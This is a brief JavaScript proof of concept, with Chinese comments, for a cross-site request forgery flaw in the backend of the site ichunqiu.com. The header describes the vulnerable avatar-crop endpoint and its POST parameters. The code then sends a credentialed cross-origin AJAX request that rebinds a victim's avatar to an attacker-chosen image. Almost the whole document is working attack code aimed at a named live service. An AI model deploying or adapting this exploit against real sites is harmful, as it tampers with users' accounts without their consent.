/*

    Document

    ichuqniu.com 

    后台csrf漏洞

    URL: https://www.ichunqiu.com/personal/caijian

    POST_Data:

        img=resources/upload/images/190808/avatar_517669.jpg
        x=0
        y=0
        w=234
        h=234
        picpath=''

    攻击成功后，被攻击者的头像将会和avatar_517669.jpg绑定

*/

$.ajax({
    type: 'POST',
    url: 'https://www.ichunqiu.com/personal/caijian',
    dataType: 'json',
    data: {
        "img": "resources/upload/images/190808/avatar_517669.jpg",
        "x": 0,
        "y": 0,
        "w": 234,
        "h": 234,
        "picpath": ""
    },
    xhrFields: {
      withCredentials:true  //支持附带详细信息,可以携带cookie
    },
    crossDomain: true,//请求偏向外域,支持跨域请求
    success: function (data) {
      console.log(data);
    }
});

